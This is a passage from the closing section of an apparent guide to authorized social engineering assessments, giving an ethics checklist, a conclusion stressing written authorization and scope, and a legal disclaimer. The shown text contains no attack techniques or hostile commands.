4. **Professionalism:** Would I be comfortable describing my methods to the security community, client executives, and affected employees?
5. **Harm:** Could this campaign cause harm beyond the intended assessment scope (reputation damage, job loss, emotional distress)?
6. **Alternatives:** Are there less intrusive ways to test the same security controls?
7. **Value:** Will this assessment provide genuine value to the client's security posture?

If any answer gives you pause, reconsider your approach or consult with colleagues, client, or legal counsel.

---

## Conclusion

Social engineering assessments are powerful tools for improving organizational security, but they carry significant ethical and legal responsibilities.

**Remember:**
- **Authorization is mandatory:** Never conduct SE without explicit written permission
- **Boundaries are sacred:** Never exceed your authorized scope
- **People are not targets:** Conduct assessments professionally and ethically
- **Documentation is critical:** Thorough documentation protects you and serves the client
- **Improvement is the goal:** Your purpose is strengthening security, not breaking it

**These prompts and techniques are tools.** Like any tool, they can be used responsibly for legitimate purposes or irresponsibly with harmful consequences. The choice is yours.

**Use them wisely. Use them ethically. Use them only with proper authorization.**

---

**⚠️ FINAL LEGAL DISCLAIMER**

The authors, contributors, and publishers of this guide:
- Provide this information for educational and professional consulting purposes only
- Assume no responsibility for unauthorized, illegal, or unethical use
- Strongly condemn use of these techniques without proper authorization
- Are not liable for any consequences arising from use or misuse of this information
- Encourage consultation with legal counsel before conducting SE assessments
- Remind users that laws vary by jurisdiction and change over time

**By using any techniques in this guide, you accept full personal responsibility for ensuring you have proper authorization, are operating within legal boundaries, and are conducting yourself ethically and professionally.**

**When in doubt, don't. Consult your legal counsel, your client, or both.**
